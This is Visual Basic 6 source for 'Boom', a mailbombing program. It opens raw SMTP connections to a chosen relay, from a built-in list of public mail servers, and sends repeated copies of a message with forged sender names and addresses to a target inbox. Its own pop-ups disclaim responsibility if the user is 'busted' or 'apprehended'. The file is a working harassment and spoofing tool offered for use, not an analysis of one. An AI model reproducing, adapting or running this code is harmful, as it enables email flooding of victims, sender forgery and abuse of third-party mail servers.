VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   Caption         =   "Mailbombing Session"
   ClientHeight    =   5205
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5700
   Icon            =   "frmBoom.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MDIChild        =   -1  'True
   ScaleHeight     =   5205
   ScaleWidth      =   5700
   Begin VB.Frame frmCommands 
      Caption         =   "Commands"
      Height          =   1695
      Left            =   3360
      TabIndex        =   16
      Top             =   1920
      Width           =   2175
      Begin VB.CommandButton cmdStop 
         Caption         =   "STOP!"
         Height          =   615
         Left            =   360
         Picture         =   "frmBoom.frx":0442
         Style           =   1  'Graphical
         TabIndex        =   18
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton cmdStart 
         Caption         =   "BOOM!"
         Height          =   615
         Left            =   360
         Picture         =   "frmBoom.frx":0884
         Style           =   1  'Graphical
         TabIndex        =   17
         Top             =   240
         Width           =   1455
      End
   End
   Begin VB.Frame frmCopies 
      Caption         =   "Number of Copies"
      Height          =   735
      Left            =   3360
      TabIndex        =   14
      Top             =   1080
      Width           =   2175
      Begin VB.TextBox txtCopies 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         MaxLength       =   2
         TabIndex        =   15
         Text            =   "10"
         Top             =   240
         Width           =   1935
      End
   End
   Begin VB.TextBox SUBJECT 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   120
      TabIndex        =   5
      Top             =   2985
      Width           =   3045
   End
   Begin VB.TextBox MAIL_TO 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   120
      TabIndex        =   3
      Top             =   1680
      Width           =   3045
   End
   Begin VB.TextBox FROM 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Top             =   360
      Width           =   3045
   End
   Begin VB.TextBox STATUS 
      Appearance      =   0  'Flat
      BackColor       =   &H80000004&
      BorderStyle     =   0  'None
      Height          =   285
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   0
      TabStop         =   0   'False
      Text            =   "Waiting.."
      Top             =   4860
      Width           =   3225
   End
   Begin VB.TextBox DATA 
      Appearance      =   0  'Flat
      Height          =   1185
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   6
      Top             =   3630
      Width           =   3045
   End
   Begin VB.TextBox RCPT_TO 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   120
      TabIndex        =   4
      Top             =   2325
      Width           =   3045
   End
   Begin VB.TextBox MAIL_FROM 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   120
      TabIndex        =   2
      Top             =   1020
      Width           =   3045
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   2400
      Top             =   1320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "smtp.kabelfoon.nl"
      RemotePort      =   25
      LocalPort       =   6000
   End
   Begin VB.Frame frameSMTP 
      Caption         =   "SMTP Host"
      Height          =   735
      Left            =   3360
      TabIndex        =   13
      Top             =   120
      Width           =   2175
      Begin VB.ComboBox SMTP_HOST 
         Height          =   315
         Left            =   120
         TabIndex        =   19
         Top             =   240
         Width           =   1935
      End
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Sender's name:"
      Height          =   255
      Left            =   120
      TabIndex        =   12
      Top             =   120
      Width           =   1125
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "Subject:"
      Height          =   255
      Left            =   120
      TabIndex        =   11
      Top             =   2730
      Width           =   645
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Receiver's name:"
      Height          =   255
      Left            =   120
      TabIndex        =   10
      Top             =   1425
      Width           =   1275
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Body:"
      Height          =   255
      Left            =   120
      TabIndex        =   9
      Top             =   3375
      Width           =   480
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Receiver's e-mail address:"
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   2085
      Width           =   1950
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Sender's e-mail address:"
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   765
      Width           =   1935
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Progress
Dim Green_Light As Boolean
Dim DATAFile As String

Private Sub cmdInfo_Click()
MsgBox "Boom 1.1.0 - Coded / Tested on Windows 98SE and Windows2000"


End Sub

Private Sub cmdNew_Click()
Dim NewForm As New frmMain
NewForm.Show

End Sub

Private Sub cmdStart_Click()
MsgBox "You are starting this bombing session on your own accord! If you get busted I am not responsible!"

If txtCopies.Text > 10 Then MsgBox "SORRY! You cannot send more than 10 copies!"
If txtCopies.Text > 10 Then txtCopies.Text = "10"


While txtCopies.Text <> "0"

'all that below just tests to see if the user has entered text in all the boxes
If FROM.Text = "" Then
MsgBox "Senders Name is empty!"
GoTo 1
End If
If MAIL_FROM.Text = "" Then
MsgBox "Senders Address is empty!"
GoTo 1
End If
If MAIL_TO.Text = "" Then
MsgBox "Receivers Name is empty!"
GoTo 1
End If
If RCPT_TO.Text = "" Then
MsgBox "Receivers Address is empty!"
GoTo 1
End If
If SUBJECT.Text = "" Then
MsgBox "Subject Box is Empty!"
GoTo 1
End If

If SMTP_HOST.Text = "" Then
MsgBox "No SMTP Host Specified"
GoTo 1
End If


'This is where we open the connection to the server and send all the data
Winsock1.Close
Winsock1.Connect SMTP_HOST, "25" 'port 25
Do While Winsock1.State <> sckConnected 'finds out if connected
DoEvents
STATUS.Text = "Connecting to " & SMTP_HOST & ". Please wait." 'adds status to a textbox
Loop
STATUS.Text = "Connected to " & SMTP_HOST & "."

Do While Green_Light = False
DoEvents
STATUS.Text = "Waiting for reply..."
Loop
Winsock1.SendData "MAIL FROM: " & MAIL_FROM & Chr$(13) & Chr$(10) 'it then sends the data out of the text boxes

Do While Progress <> 1
DoEvents
STATUS.Text = "Sending data. (1 of 3)"
Loop
Winsock1.SendData "RCPT TO: " & RCPT_TO & Chr$(13) & Chr$(10)

Do While Progress <> 2
DoEvents
STATUS.Text = "Sending data. (2 of 3)"
Loop
Winsock1.SendData "DATA" & Chr$(13) & Chr$(10)

Do While Progress <> 3
DoEvents
STATUS.Text = "Setting up body transfer..."
Loop
Winsock1.SendData "FROM: " & FROM & " <" & MAIL_FROM & ">" & Chr$(13) & Chr$(10)
Winsock1.SendData "TO: " & MAIL_TO & " <" & RCPT_TO & ">" & Chr$(13) & Chr$(10)
Winsock1.SendData "SUBJECT: " & SUBJECT & Chr$(13) & Chr$(10)
Winsock1.SendData Chr$(13) & Chr$(10)
Winsock1.SendData DATA & Chr$(13) & Chr$(10)

Winsock1.SendData Chr$(13) & Chr$(10) & "." & Chr$(13) & Chr$(10)

Do While Progress <> 4
DoEvents
STATUS.Text = "Sending data. (3 of 3)"
Loop
Winsock1.SendData "QUIT" & Chr$(13) & Chr$(10)
STATUS.Text = "Done"
Winsock1.Close
SMTP_HOST = ""
FROM = ""
MAIL_FROM = ""
MAIL_TO = ""
RCPT_TO = ""
SUBJECT = ""
DATA = ""
STATUS = ""


txtCopies.Text = txtCopies.Text - 1

frmLog.txtLog.Text = frmLog.txtLog.Text + "[Sent Message to - " & RCPT_TO.Text & " via " & SMTP_HOST.Text & " @ " & Time$ & " ]    "
Wend

1
End Sub

Private Sub cmdStop_Click()
txtCopies.Text = "0"

End Sub

Private Sub Form_Load()


Me.Height = 5610
Me.Width = 5820

SMTP_HOST.AddItem "mail.btinternet.com"
SMTP_HOST.Text = "mail.btinternet.com"
SMTP_HOST.AddItem "mail.geocities.com"
SMTP_HOST.AddItem "mail.hotmail.com"
SMTP_HOST.AddItem "smtp.mail.yahoo.com"
SMTP_HOST.AddItem "mx.boston.juno.com"
SMTP_HOST.AddItem "mail-intake-1.mail.com"
SMTP_HOST.AddItem "mail.atl.bellsouth.net"
SMTP_HOST.AddItem "inbound-mail.netzero.net"
SMTP_HOST.AddItem "mail5.microsoft.com"
SMTP_HOST.AddItem "smtp.email.msn.com"
SMTP_HOST.AddItem "smtp.paradise.net.nz"
SMTP_HOST.AddItem "smtp.xtra.co.nz"


End Sub

Private Sub MAIL_RESET_Click()

End Sub

Private Sub Picture1_Click()
'all that below just tests to see if the user has entered text in all the boxes
If FROM.Text = "" Then
Form2.Show
GoTo 1
End If
If MAIL_FROM.Text = "" Then
Form2.Show
GoTo 1
End If
If MAIL_TO.Text = "" Then
Form2.Show
GoTo 1
End If
If RCPT_TO.Text = "" Then
Form2.Show
GoTo 1
End If
If SUBJECT.Text = "" Then
Form2.Show
GoTo 1
End If

'This is where we open the connection to the server and send all the data
Winsock1.Close
Winsock1.Connect SMTP_HOST, "25" 'port 25
Do While Winsock1.State <> sckConnected 'finds out if connected
DoEvents
STATUS.Text = "Connecting to " & SMTP_HOST & ". Please wait." 'adds status to a textbox
Loop
STATUS.Text = "Connected to " & SMTP_HOST & "."

Do While Green_Light = False
DoEvents
STATUS.Text = "Waiting for reply..."
Loop
Winsock1.SendData "MAIL FROM: " & MAIL_FROM & Chr$(13) & Chr$(10) 'it then sends the data out of the text boxes

Do While Progress <> 1
DoEvents
STATUS.Text = "Sending data. (1 of 3)"
Loop
Winsock1.SendData "RCPT TO: " & RCPT_TO & Chr$(13) & Chr$(10)

Do While Progress <> 2
DoEvents
STATUS.Text = "Sending data. (2 of 3)"
Loop
Winsock1.SendData "DATA" & Chr$(13) & Chr$(10)

Do While Progress <> 3
DoEvents
STATUS.Text = "Setting up body transfer..."
Loop
Winsock1.SendData "FROM: " & FROM & " <" & MAIL_FROM & ">" & Chr$(13) & Chr$(10)
Winsock1.SendData "TO: " & MAIL_TO & " <" & RCPT_TO & ">" & Chr$(13) & Chr$(10)
Winsock1.SendData "SUBJECT: " & SUBJECT & Chr$(13) & Chr$(10)
Winsock1.SendData Chr$(13) & Chr$(10)
Winsock1.SendData DATA & Chr$(13) & Chr$(10)

Winsock1.SendData Chr$(13) & Chr$(10) & "." & Chr$(13) & Chr$(10)

Do While Progress <> 4
DoEvents
STATUS.Text = "Sending data. (3 of 3)"
Loop
Winsock1.SendData "QUIT" & Chr$(13) & Chr$(10)
STATUS.Text = "Done"
Winsock1.Close
SMTP_HOST = ""
FROM = ""
MAIL_FROM = ""
MAIL_TO = ""
RCPT_TO = ""
SUBJECT = ""
DATA = ""
STATUS = ""
1:
End Sub

Private Sub Picture2_Click()
Winsock1.Close 'this closes the connection
SMTP_HOST = ""
FROM = ""
MAIL_FROM = ""
MAIL_TO = ""
RCPT_TO = ""
SUBJECT = ""
DATA = ""
STATUS = "" 'making all the textboxes blank
End Sub

Private Sub Picture3_Click()
End 'if you are a REAL beginer this just closes the application
End Sub

Private Sub Picture4_Click()
Me.WindowState = 1 'we then minimize the form by using the windowstate = ( 0 for normal, 1 for minimised, and 3 for maximized)
End Sub

Private Sub mnuExit_Click()
End

End Sub

Private Sub mnuHelpAbout_Click()
cmdInfo.Value = True

End Sub

Private Sub RCPT_TO_Change()
Me.Caption = "Mailbombing Session [To - " & RCPT_TO.Text & " ]"
If RCPT_TO.Text = "" Then Me.Caption = "Mailbombing Session"

End Sub

Private Sub SMTP_HOST_Click()
MsgBox "Pleas note that you are chosing the SMTP server on your own accord and that the author is not responsible if you are apprehended while using any of these servers!"
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Winsock1.GetData DATAFile 'this just recieves the data telling us if sucefful
Reply = Mid(DATAFile, 1, 3)

If Reply = 250 Or Reply = 354 Then
Progress = Progress + 1
End If
If Reply = 220 Then
Green_Light = True
End If
End Sub



